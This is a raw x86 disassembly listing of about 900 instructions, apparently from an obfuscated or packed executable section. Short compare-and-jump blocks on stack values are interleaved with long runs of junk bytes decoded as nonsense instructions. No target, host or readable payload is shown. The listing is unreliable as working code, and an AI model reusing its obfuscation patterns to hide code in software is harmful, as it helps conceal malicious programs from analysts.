  401910:	or     esi,0x1b391490
  401916:	in     eax,0x6a
  401918:	jbe    0x40191b
  40191a:	int3   
  40191b:	inc    eax
  40191c:	or     eax,DWORD PTR [edi-0x31]
  40191f:	and    ebx,DWORD PTR ds:0x9c0155d6
  401925:	fst    QWORD PTR [ecx+eax*1-0x46]
  401929:	add    BYTE PTR [edi],dl
  40192b:	dec    edi
  40192c:	cmp    bl,BYTE PTR [eax+0x11]
  40192f:	and    al,BYTE PTR [ecx+edx*8+0xe0d0503]
  401936:	mov    bh,0x75
  401938:	mov    ah,0x7d
  40193a:	sub    eax,DWORD PTR [ebp+0x22]
  40193d:	mov    bl,BYTE PTR [ebx]
  40193f:	pop    esp
  401940:	or     BYTE PTR [edx+0x33],ah
  401943:	inc    esi
  401944:	sub    bl,ah
  401946:	jmp    0x89f9:0x884626f4
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xe57bf628
  401994:	cs mov al,0x1e
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	into   
  4019a0:	imul   esp,edi,0x24
  4019a3:	pop    ds
  4019a4:	les    edx,FWORD PTR [eax]
  4019a6:	mov    ebp,0x3d87deaf
  4019ab:	xlat   BYTE PTR ds:[ebx]
  4019ac:	or     bh,dh
  4019ae:	retf   0x2e58
  4019b1:	add    eax,0x980d04b1
  4019b6:	jne    0x4019ef
  4019b8:	in     al,dx
  4019b9:	jge    0x40197f
  4019bb:	jno    0x401a13
  4019bd:	inc    edx
  4019be:	dec    eax
  4019bf:	shl    BYTE PTR [esi-0x5a],0xd
  4019c3:	enter  0xaa41,0x9a
  4019c7:	fldenv [edx+0x1a]
  4019ca:	cmp    al,0xa0
  4019cc:	adc    al,0xa5
  4019ce:	aad    0xcf
  4019d0:	outs   dx,BYTE PTR ds:[esi]
  4019d1:	aam    0x31
  4019d3:	bound  ebx,QWORD PTR [eax]
  4019d5:	pop    ecx
  4019d6:	neg    edi
  4019d8:	stos   BYTE PTR es:[edi],al
  4019d9:	das    
  4019da:	add    edi,ebp
  4019dc:	lods   eax,DWORD PTR ds:[esi]
  4019dd:	xchg   esp,eax
  4019de:	pushf  
  4019df:	call   0x462e2187
  4019e4:	sub    eax,0xffb5203f
  4019e9:	lea    edi,[edi-0x32]
  4019ec:	add    eax,0xba3364d3
  4019f1:	(bad)  [esi+ebp*2+0x7f9fb5a9]
  4019f8:	(bad)  
  4019f9:	mov    ch,0xb5
  4019fb:	sub    BYTE PTR [eax],0xa3
  4019fe:	mov    ah,0x28
  401a00:	mov    ch,0x5f
  401a02:	adc    DWORD PTR [eax+ebp*2-0x2c],edx
  401a06:	dec    edi
  401a07:	inc    ecx
  401a08:	ins    BYTE PTR es:[edi],dx
  401a09:	cld    
  401a0a:	aad    0x71
  401a0c:	(bad)  
  401a0d:	mov    ss,WORD PTR [edx+0x7e]
  401a10:	xchg   edi,eax
  401a11:	jns    0x4019db
  401a13:	jg     0x401a13
  401a15:	jno    0x401a86
  401a17:	(bad)  
  401a18:	add    al,0x23
  401a1a:	rol    DWORD PTR [edx+0x236f14a2],1
  401a20:	xchg   esi,eax
  401a21:	and    bl,BYTE PTR [esp+edi*1+0x24329f33]
  401a28:	bound  ebx,QWORD PTR cs:[ebx]
  401a2b:	retf   
  401a2c:	mov    ebp,0x1f966d9a
  401a31:	or     cl,BYTE PTR [esi+0x2]
  401a34:	data16 fsubr QWORD PTR [ebp+esi*1+0x57]
  401a39:	test   eax,0xd74609bb
  401a3e:	popa   
  401a3f:	pop    esp
  401a40:	outs   dx,DWORD PTR ds:[esi]
  401a41:	xchg   ebx,eax
  401a42:	or     al,0x5a
  401a44:	(bad)  
  401a45:	mov    ebp,0xf85687b2
  401a4a:	sti    
  401a4b:	das    
  401a4c:	ja     0x401a7b
  401a4e:	mov    DWORD PTR [eax-0x530b806],esi
  401a54:	jmp    0x401a01
  401a56:	sahf   
  401a57:	push   ds
  401a58:	repnz stos DWORD PTR es:[edi],eax
  401a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a5b:	nop
  401a5c:	aaa    
  401a5d:	add    edi,DWORD PTR [ebp+0x233b7c48]
  401a63:	xchg   BYTE PTR [ecx],dl
  401a65:	and    ch,BYTE PTR [ecx-0x5]
  401a68:	das    
  401a69:	sbb    al,0xfb
  401a6b:	xchg   ebx,eax
  401a6c:	xor    edi,DWORD PTR [eax+esi*4-0x15]
  401a70:	js     0x401abc
  401a72:	ficom  DWORD PTR [esi-0x307ed8fd]
  401a78:	cmp    al,0x26
  401a7a:	jmp    0x4019fd
  401a7c:	push   0xec6a6439
  401a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a82:	shl    esi,cl
  401a84:	gs jb  0x401ab4
  401a87:	imul   edi,DWORD PTR [edx+0x40c7b0c],0x6864fa5
  401a91:	ret    
  401a92:	push   ecx
  401a93:	mov    esp,esi
  401a95:	imul   eax,ebp,0x30b4ca07
  401a9b:	adc    BYTE PTR [esi+0x23],0x31
  401a9f:	sub    al,0x2a
  401aa1:	pop    ss
  401aa2:	pop    esp
  401aa3:	xchg   esi,eax
  401aa4:	sub    eax,0xc9fc42bc
  401aa9:	dec    ebp
  401aaa:	imul   edi,DWORD PTR [ecx],0x8fa34446
  401ab0:	out    dx,eax
  401ab1:	lods   al,BYTE PTR ds:[esi]
  401ab2:	pop    ecx
  401ab3:	mov    esi,0x7fbeacdd
  401ab8:	or     BYTE PTR [ecx-0x444664],ah
  401abe:	jb     0x401a43
  401ac0:	sbb    eax,0xdbc77b1b
  401ac5:	test   DWORD PTR [eax],ebx
  401ac7:	and    dl,ch
  401ac9:	inc    ebp
  401aca:	lahf   
  401acb:	inc    BYTE PTR [esp+ecx*8+0x3e3d6b43]
  401ad2:	push   cs
  401ad3:	sbb    ch,ch
  401ad5:	and    ah,BYTE PTR [edi+edx*8-0x5e]
  401ad9:	loopne 0x401b50
  401adb:	(bad)  
  401adc:	mov    ebp,0x5bd15036
  401ae1:	mov    dh,0xb1
  401ae3:	or     al,0x43
  401ae5:	(bad)  
  401ae6:	adc    BYTE PTR [ebx-0x6e],al
  401ae9:	gs (bad) 
  401aec:	jge    0x401b44
  401aee:	mov    edx,0x5b6fd848
  401af3:	pminub mm3,mm1
  401af6:	hlt    
  401af7:	inc    esp
  401af8:	add    bh,0xce
  401afb:	outs   dx,DWORD PTR ds:[esi]
  401afc:	dec    eax
  401afd:	add    BYTE PTR [esi+0x4257c5af],al
  401b03:	loop   0x401a8e
  401b05:	outs   dx,DWORD PTR ds:[esi]
  401b06:	dec    ebp
  401b07:	xor    al,0x1d
  401b09:	xchg   ebx,eax
  401b0a:	mov    ds:0x3cc17043,al
  401b0f:	pop    eax
  401b10:	xchg   edx,eax
  401b11:	mov    ebx,0x923736e6
  401b16:	dec    ecx
  401b17:	rcr    DWORD PTR [edx-0x3f1ed1d3],1
  401b1d:	adc    eax,0xf55dd29d
  401b22:	sbb    DWORD PTR [esi+0x17],ebx
  401b25:	xchg   edi,eax
  401b26:	dec    ecx
  401b27:	mov    ds:0x44882253,eax
  401b2c:	push   ss
  401b2d:	dec    eax
  401b2e:	in     eax,dx
  401b2f:	xchg   ebx,eax
  401b30:	imul   edx,DWORD PTR [edx-0x3e],0x51
  401b34:	shl    DWORD PTR [eax-0xf],0x76
  401b38:	add    eax,0x28bba29e
  401b3d:	adc    DWORD PTR [ebp+0x2b24ddda],ecx
  401b43:	into   
  401b44:	mov    esp,0x1820756f
  401b49:	push   ds
  401b4a:	fs pop es
  401b4c:	iret   
  401b4d:	push   ss
  401b4e:	pusha  
  401b4f:	dec    edx
  401b50:	inc    ebx
  401b51:	(bad)  [edx+0x33f02b92]
  401b57:	sbb    BYTE PTR [edi-0x109c4885],al
  401b5d:	jmp    0xf388:0x7669a882
  401b64:	outs   dx,DWORD PTR ds:[esi]
  401b65:	cmp    edi,DWORD PTR [ebp-0x7837e34]
  401b6b:	xor    cl,BYTE PTR [edi-0x51e819de]
  401b71:	xor    BYTE PTR [edx+0x57],ch
  401b74:	or     bl,dl
  401b76:	jnp    0x401b5c
  401b78:	pop    edi
  401b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b7a:	mov    eax,ds:0x9b830fee
  401b7f:	adc    DWORD PTR [edx],0xffffffe4
  401b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b83:	xchg   edi,ebx
  401b85:	cmp    eax,0xe8bec936
  401b8a:	xchg   DWORD PTR [edi-0x469c24f3],edx
  401b90:	cmp    BYTE PTR ds:0x494fe8a5,ch
  401b96:	in     eax,dx
  401b97:	loopne 0x401b60
  401b99:	(bad)  
  401b9b:	xchg   esi,eax
  401b9c:	mov    al,ds:0x458bf277
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dl,BYTE PTR [ecx+0x52]
  401bde:	jb     0x401c2b
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	frstor [edx+esi*2+0x7c479157]
  401bef:	push   ebp
  401bf0:	cmp    al,0x28
  401bf2:	pop    ss
  401bf3:	mov    edx,0x68f321a0
  401bf8:	pop    ecx
  401bf9:	mov    eax,0xcf62d175
  401bfe:	sbb    ecx,ecx
  401c00:	pop    ebx
  401c01:	fldcw  WORD PTR [eax-0x8]
  401c04:	aam    0xd5
  401c06:	mov    ebp,0x13ab9bad
  401c0b:	shl    BYTE PTR [eax+0xf],0x23
  401c0f:	push   esp
  401c10:	aaa    
  401c11:	xor    al,0x79
  401c13:	or     DWORD PTR [esi+0xb],ecx
  401c16:	nop
  401c17:	mov    WORD PTR [edx+eiz*2],ss
  401c1a:	stos   BYTE PTR es:[edi],al
  401c1b:	cdq    
  401c1c:	addr16 (bad) 
  401c1e:	clc    
  401c1f:	cmp    al,0xf9
  401c21:	sbb    ch,BYTE PTR [edx]
  401c23:	jmp    0xfb76aef6
  401c28:	add    eax,0x4136a10f
  401c2d:	in     eax,dx
  401c2e:	push   eax
  401c2f:	fist   DWORD PTR [ecx+0x171c084f]
  401c35:	jmp    0xadee2f98
  401c3a:	mov    bh,0x27
  401c3c:	adc    al,0x79
  401c3e:	das    
  401c3f:	daa    
  401c40:	cld    
  401c41:	fst    DWORD PTR [ecx+eiz*2+0x170633e1]
  401c48:	popf   
  401c49:	push   esi
  401c4a:	and    bl,dl
  401c4c:	push   edi
  401c4d:	jmp    0x401bd7
  401c4f:	and    ah,dh
  401c51:	mov    esp,0x96c34ac9
  401c56:	imul   edx,DWORD PTR [eax-0x56],0xe819d7d4
  401c5d:	pop    ebp
  401c5e:	addr16 mov cs,ebx
  401c61:	or     DWORD PTR gs:0x4c67be62,ebp
  401c68:	dec    eax
  401c69:	sbb    eax,0x5e6f8fd3
  401c6e:	imul   esp,ebx,0x7
  401c71:	xchg   edx,eax
  401c72:	push   eax
  401c73:	dec    edx
  401c74:	push   es
  401c75:	and    eax,0xeeff8b52
  401c7a:	shl    DWORD PTR [ecx-0x383e8e02],0x63
  401c81:	sbb    ebp,DWORD PTR [ecx]
  401c83:	add    esp,DWORD PTR [eax+eiz*4+0x15]
  401c87:	(bad)  
  401c88:	and    ecx,DWORD PTR [esi]
  401c8a:	aad    0x88
  401c8c:	mov    ecx,DWORD PTR [edx-0x5a1a7290]
  401c92:	inc    esi
  401c93:	ror    BYTE PTR [edx+0x78],1
  401c96:	addr16 (bad) 
  401c98:	sti    
  401c99:	fs pop ebx
  401c9b:	hlt    
  401c9c:	out    0x9e,al
  401c9e:	dec    ebp
  401c9f:	jo     0x401c43
  401ca1:	ret    0x20f1
  401ca4:	cli    
  401ca5:	inc    esi
  401ca6:	mov    ds:0xab6c603,eax
  401cab:	xor    BYTE PTR [ecx-0x52],0x56
  401caf:	xor    BYTE PTR [ebx-0x6a2bb387],ah
  401cb5:	in     eax,0x3b
  401cb7:	icebp  
  401cb8:	call   0x6c62:0x982a4d06
  401cbf:	cwde   
  401cc0:	(bad)  
  401cc1:	rcr    DWORD PTR [eax-0x6],cl
  401cc4:	dec    esi
  401cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cc6:	push   ss
  401cc7:	mov    ecx,0x5d964812
  401ccc:	mov    DWORD PTR [ebp-0x57],0x41ed4702
  401cd3:	mov    dl,0x7
  401cd5:	push   edx
  401cd6:	test   DWORD PTR [edi+edx*4],ecx
  401cd9:	clc    
  401cda:	xchg   esi,eax
  401cdb:	push   esp
  401cdc:	sbb    ecx,esi
  401cde:	or     DWORD PTR ds:0xcc4e0eca,0xfffffff7
  401ce5:	push   edx
  401ce6:	mov    WORD PTR [esi-0x1643a1bb],?
  401cec:	fs and ebp,ebp
  401cef:	inc    edx
  401cf0:	retf   
  401cf1:	dec    esi
  401cf2:	rcr    BYTE PTR [ecx+0x12],1
  401cf5:	push   ebp
  401cf6:	jle    0x401c98
  401cf8:	lea    edx,[ebp+0x37]
  401cfb:	jge    0x401cc8
  401cfd:	mov    ebx,0xae65d428
  401d02:	fdivr  QWORD PTR [edi+0x6c]
  401d05:	jnp    0x401d01
  401d07:	mov    dh,0xe2
  401d09:	sbb    al,0xad
  401d0b:	cdq    
  401d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d0d:	add    al,0x55
  401d0f:	stos   BYTE PTR es:[edi],al
  401d10:	and    ebp,DWORD PTR ds:0x643f724b
  401d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d17:	stc    
  401d18:	or     al,BYTE PTR [ebx+0x3f]
  401d1b:	test   dl,dl
  401d1d:	in     eax,0x6c
  401d1f:	push   0x49f35703
  401d24:	mov    dl,bl
  401d26:	pop    edi
  401d27:	inc    esp
  401d28:	pop    ebp
  401d29:	adc    BYTE PTR [edi-0x24e96419],al
  401d2f:	popf   
  401d30:	mov    ebp,0x8beb8492
  401d35:	adc    ebp,eax
  401d37:	xor    al,0x49
  401d39:	into   
  401d3a:	sub    al,0x80
  401d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d3d:	out    0xeb,al
  401d3f:	inc    edx
  401d40:	dec    ebp
  401d41:	pop    esi
  401d42:	sbb    al,0xd5
  401d44:	addr16 push ebp
  401d46:	aas    
  401d47:	lds    ebp,FWORD PTR [esi]
  401d49:	lods   eax,DWORD PTR ds:[esi]
  401d4a:	aam    0xbc
  401d4c:	mov    ah,0x34
  401d4e:	cld    
  401d4f:	shl    DWORD PTR [edx],0x10
  401d52:	mov    ah,bl
  401d54:	pusha  
  401d55:	xchg   esi,eax
  401d56:	daa    
  401d57:	jg     0x401d3d
  401d59:	jns    0x401daf
  401d5b:	mov    bl,0xe9
  401d5d:	and    al,BYTE PTR [eax-0x6b7f4b]
  401d63:	add    ebx,esi
  401d65:	stos   BYTE PTR es:[edi],al
  401d66:	cmp    ebp,edi
  401d68:	out    dx,eax
  401d69:	test   eax,0x50102062
  401d6e:	push   ecx
  401d6f:	xor    al,0x49
  401d71:	adc    al,0xa2
  401d73:	out    dx,eax
  401d74:	in     eax,0x77
  401d76:	and    dl,al
  401d78:	inc    edi
  401d79:	repz loopne 0x401d97
  401d7c:	inc    ecx
  401d7d:	lock stos BYTE PTR es:[edi],al
  401d7f:	jp     0x401d47
  401d81:	dec    esp
  401d82:	js     0x401d0c
  401d84:	add    edx,DWORD PTR [ecx+0x45]
  401d87:	mov    eax,0x1b3e7f62
  401d8c:	cmp    DWORD PTR [ebp+0x59],0x17986379
  401d93:	aaa    
  401d94:	jne    0x401de4
  401d96:	dec    esp
  401d97:	mov    ecx,0x16f4cd5b
  401d9c:	xchg   ebx,eax
  401d9d:	jb     0x401d96
  401d9f:	pop    ebx
  401da0:	cmp    al,0x73
  401da2:	popf   
  401da3:	aad    0x15
  401da5:	fwait
  401da6:	xor    eax,ebp
  401da8:	and    BYTE PTR [edi+0x4dc611f],ch
  401dae:	call   0x2445629
  401db3:	test   ch,0x54
  401db6:	cwde   
  401db7:	sti    
  401db8:	sbb    DWORD PTR [edi-0x5e8a6076],esp
  401dbe:	inc    esp
  401dbf:	inc    edx
  401dc0:	popf   
  401dc1:	push   ebp
  401dc2:	test   DWORD PTR [esi],edi
  401dc4:	loop   0x401e03
  401dc6:	xchg   DWORD PTR [edx+0x4a],ebx
  401dc9:	daa    
  401dca:	jmp    0x833b:0x642d117b
  401dd1:	xor    DWORD PTR [ecx-0x30f02fb4],edx
  401dd7:	push   eax
  401dd8:	sbb    BYTE PTR [eax],0x40
  401ddb:	jne    0x401e0b
  401ddd:	arpl   WORD PTR [eax],si
  401ddf:	in     eax,0xea
  401de1:	fcom   st(4)
  401de3:	iret   
  401de4:	retf   0x104a
  401de7:	cli    
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+ecx*2+0x15],dl
  401e44:	ror    DWORD PTR [ebx],1
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	cmp    DWORD PTR [edi-0x2],edi
  401e51:	test   eax,0xc2e41b4a
  401e56:	mov    BYTE PTR ds:0x67909f3c,cl
  401e5c:	inc    edi
  401e5d:	scas   eax,DWORD PTR es:[edi]
  401e5e:	jmp    0x6226:0x1798724b
  401e65:	in     al,dx
  401e66:	and    al,0xc5
  401e68:	(bad)  
  401e6a:	ja     0x401e7e
  401e6c:	push   esp
  401e6d:	jge    0x401eae
  401e6f:	lds    ecx,FWORD PTR [ebp+0x383fe984]
  401e75:	enter  0xa06f,0x8f
  401e79:	inc    eax
  401e7a:	xchg   cx,dx
  401e7d:	push   eax
  401e7e:	mov    ecx,0xf90c91e0
  401e83:	fimul  DWORD PTR [ebx+0x711f11c2]
  401e89:	jl     0x401ef2
  401e8b:	or     ebp,DWORD PTR [edi+ecx*2]
  401e8e:	dec    esi
  401e8f:	ret    
  401e90:	(bad)  
  401e91:	cdq    
  401e92:	sub    ah,BYTE PTR [eax-0x28]
  401e95:	push   cs
  401e96:	into   
  401e97:	inc    edx
  401e98:	(bad)  
  401e9a:	scas   al,BYTE PTR es:[edi]
  401e9b:	fist   WORD PTR [eax-0x7c]
  401e9e:	jmp    0xa90a:0x97c32f0
  401ea5:	jnp    0x401f05
  401ea7:	ret    0xccac
  401eaa:	sub    al,0x51
  401eac:	ja     0x401eea
  401eae:	repz test BYTE PTR [ecx],al
  401eb1:	push   ecx
  401eb2:	xor    BYTE PTR [esi+0x11],bl
  401eb5:	mov    bl,0xe7
  401eb7:	iret   
  401eb8:	xor    edx,DWORD PTR [edi+0xb]
  401ebb:	daa    
  401ebc:	jbe    0x401f17
  401ebe:	add    al,0xea
  401ec1:	shl    DWORD PTR [eax],0x47
  401ec4:	jns    0x401e89
  401ec6:	repz xor ch,BYTE PTR [ebp+ebp*2+0x54]
  401ecb:	out    0x19,al
  401ecd:	jb     0x401f1a
  401ecf:	fwait
  401ed0:	test   eax,0x72f3d5ae
  401ed5:	xor    bh,BYTE PTR [esi+esi*8+0x74d7f925]
  401edc:	scas   al,BYTE PTR es:[edi]
  401edd:	in     al,0x86
  401edf:	arpl   WORD PTR [ecx+0x9d6b33c],sp
  401ee5:	cmp    ebx,DWORD PTR [edx+0x2b0887cd]
  401eeb:	sub    ah,BYTE PTR [ebp-0x4eecef83]
  401ef1:	push   ds
  401ef2:	in     al,0x1d
  401ef4:	pushf  
  401ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ef6:	(bad)  
  401ef8:	rcr    BYTE PTR [ebx-0x7a9afd1d],cl
  401efe:	mov    ebx,0xffb26e48
  401f03:	pop    eax
  401f04:	fnstcw WORD PTR [edi+0x3f05ad67]
  401f0a:	sub    esp,DWORD PTR [eax]
  401f0c:	xchg   edx,eax
  401f0d:	adc    esi,DWORD PTR [ebp-0x5b]
  401f10:	adc    BYTE PTR es:[ebx-0x68],ch
  401f14:	fadd   QWORD PTR [esi]
  401f16:	sbb    eax,0x4cb34cde
  401f1b:	ds xor esp,0x37
  401f1f:	cmp    al,0x48
  401f21:	(bad)  
  401f22:	enter  0x4607,0x4e
  401f26:	aaa    
  401f27:	jl     0x401f8e
  401f29:	outs   dx,BYTE PTR ds:[esi]
  401f2a:	js     0x401f09
  401f2c:	or     eax,0xeb62c507
  401f31:	lods   al,BYTE PTR ds:[esi]
  401f32:	sub    ah,BYTE PTR [edi+0x64e2a88d]
  401f38:	xchg   DWORD PTR [esi-0x2f],edi
  401f3b:	je     0x401ecf
  401f3d:	stos   BYTE PTR es:[edi],al
  401f3e:	pop    ebx
  401f3f:	cmp    DWORD PTR [edi*4-0x174a1432],eax
  401f46:	jl     0x401f8d
  401f48:	(bad)  
  401f49:	outs   dx,BYTE PTR ds:[esi]
  401f4a:	f2xm1  
  401f4c:	xor    eax,0x14ccd9d1
  401f51:	sub    eax,edi
  401f53:	into   
  401f54:	xchg   edx,eax
  401f55:	sbb    ch,BYTE PTR [ecx]
  401f57:	ins    BYTE PTR es:[edi],dx
  401f58:	ds inc esp
  401f5a:	daa    
  401f5b:	mov    ebp,ss
  401f5d:	(bad)  
  401f5e:	mov    eax,ds:0xf95d624c
  401f63:	out    dx,eax
  401f64:	es ins DWORD PTR es:[edi],dx
  401f66:	nop
  401f67:	or     ecx,edx
  401f69:	jg     0x401f33
  401f6b:	iret   
  401f6c:	push   es
  401f6d:	pop    edx
  401f6e:	call   0xcca192c6
  401f73:	retf   0x4157
  401f76:	shl    DWORD PTR [ecx],0xb2
  401f79:	inc    eax
  401f7a:	cdq    
  401f7b:	pop    esp
  401f7c:	in     al,0x98
  401f7e:	(bad)  
  401f7f:	out    0xe3,eax
  401f81:	cld    
  401f82:	or     BYTE PTR [ecx-0x63],ch
  401f85:	jl     0x401fef
  401f87:	ret    
  401f88:	jne    0x401f66
  401f8a:	push   eax
  401f8b:	icebp  
  401f8c:	in     al,0x7f
  401f8e:	shl    BYTE PTR [esi],1
  401f90:	mov    ebx,0x4688b4dd
  401f95:	cmp    dl,BYTE PTR [ebp-0x17]
  401f98:	popa   
  401f99:	and    esi,esp
  401f9b:	loopne 0x401f1e
  401f9d:	and    BYTE PTR [ecx+0x2f],ch
  401fa0:	or     bh,al
  401fa2:	mov    ch,BYTE PTR [edx+edx*2-0x5c66959b]
  401fa9:	pop    edi
  401faa:	mov    ds:0xf9003cd2,eax
  401faf:	jg     0x401f6b
  401fb1:	(bad)  
  401fb2:	mov    bh,0x78
  401fb4:	jl     0x401f73
  401fb6:	gs push esi
  401fb8:	push   edx
  401fb9:	cld    
  401fba:	addr16 mov ebx,0x2ef65a99
  401fc0:	mov    ecx,0xbf1d6a61
  401fc5:	scas   al,BYTE PTR es:[edi]
  401fc6:	cmc    
  401fc7:	jle    0x401ff3
  401fc9:	mov    al,0xa0
  401fcb:	in     eax,dx
  401fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fcd:	jno    0x401f75
  401fcf:	pop    esp
  401fd0:	or     ah,bh
  401fd2:	and    bl,al
  401fd4:	call   0xb1f0d3c4
  401fd9:	pop    ecx
  401fda:	loope  0x401fab
  401fdc:	mov    esi,edi
  401fde:	leave  
  401fdf:	fisub  DWORD PTR [eax+esi*4]
  401fe2:	or     cl,BYTE PTR fs:[esi+esi*1+0x50df448a]
  401fea:	(bad)  
  401feb:	rol    al,cl
  401fed:	aaa    
  401fee:	or     BYTE PTR [edx+eiz*4+0x6bfee51],dl
  401ff5:	lea    ebx,[eax-0x9ca9b43]
  401ffb:	ins    DWORD PTR es:[edi],dx
  401ffc:	mov    ah,0x84
  401ffe:	adc    ah,BYTE PTR [ecx+0x64c12e36]
  402004:	outs   dx,DWORD PTR ds:[esi]
  402005:	mov    edx,0xee753210
  40200a:	dec    esp
  40200b:	into   
  40200c:	fcom   QWORD PTR [edi]
  40200e:	lahf   
  40200f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402010:	mov    BYTE PTR [edi],ah
  402012:	and    dh,BYTE PTR [edx+edx*2+0x53]
  402016:	out    dx,eax
  402017:	push   ss
  402018:	stos   DWORD PTR es:[edi],eax
  402019:	ror    BYTE PTR [eax+0x3d637a1d],1
  40201f:	(bad)  [esi]
  402021:	out    0x9b,al
  402023:	mov    eax,0x32046f0d
  402028:	rcl    BYTE PTR [esi+0x7e70cdb1],0xa4
  40202f:	loope  0x402028
  402031:	adc    eax,0x78588177
  402036:	xor    bl,BYTE PTR [eax-0x4c9b22f9]
  40203c:	and    BYTE PTR [ecx-0x12],bh
  40203f:	sar    DWORD PTR [edi-0x69c0b8a2],cl
  402045:	or     eax,0x8c4b7810
  40204a:	shr    BYTE PTR ds:0x558bede3,0xd8
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	and    BYTE PTR [ebp-0x41],0x70
  40206d:	loopne 0x4020df
  40206f:	add    al,0x70
  402071:	jo     0x4020e3
  402073:	jle    0x4020e5
  402075:	jo     0x402081
  402077:	pop    es
  402078:	out    0xef,al
  40207a:	sub    DWORD PTR [edx-0x696b6afb],ecx
  402080:	mov    edx,0xe012a851
  402085:	fdiv   DWORD PTR [ebx-0x24]
  402088:	repnz loop 0x402032
  40208b:	jmp    0x40201a
  40208d:	pop    ebx
  40208f:	mov    ds:0x89b9ddad,eax
  402094:	int    0xc5
  402096:	xchg   esi,eax
  402097:	iret   
  402098:	(bad)  
  402099:	jnp    0x4020c1
  40209b:	daa    
  40209c:	fisttp QWORD PTR [ebx+0x3afde7e]
  4020a2:	sub    eax,0xd01d6de6
  4020a7:	add    BYTE PTR [ebx],bl
  4020a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020aa:	das    
  4020ab:	sbb    esi,DWORD PTR [ecx+0x68d14459]
  4020b1:	mov    edi,0xbbac93b9
  4020b6:	ins    BYTE PTR es:[edi],dx
  4020b7:	jno    0x402091
  4020b9:	and    DWORD PTR [eax+edx*2],0x3f8a6f5e
  4020c0:	push   edi
  4020c1:	in     eax,0x95
  4020c3:	mov    ebx,0x753c0c29
  4020c8:	sub    BYTE PTR [esi+edi*2+0x37d44f1f],0x60
  4020d0:	cmp    BYTE PTR [ecx-0x4f511fe8],al
  4020d6:	scas   eax,DWORD PTR es:[edi]
  4020d7:	pop    esi
  4020d8:	call   0x17a4:0x2da15491
  4020df:	call   0x52e597c7
  4020e4:	xor    eax,0xa9c956f4
  4020e9:	std    
  4020ea:	test   al,0xd9
  4020ec:	sbb    al,0xae
  4020ee:	in     al,dx
  4020ef:	retf   
  4020f0:	sbb    BYTE PTR [edx],cl
  4020f2:	xor    BYTE PTR [edx-0x5b1d92fa],0x26
  4020f9:	cmp    dh,0xae
  4020fc:	adc    DWORD PTR [edx],ebx
  4020fe:	das    
  4020ff:	cwde   
  402100:	xchg   BYTE PTR [ecx+eax*2],ch
  402103:	or     DWORD PTR [ebp-0x1fbcbaa0],eax
  402109:	adc    eax,esi
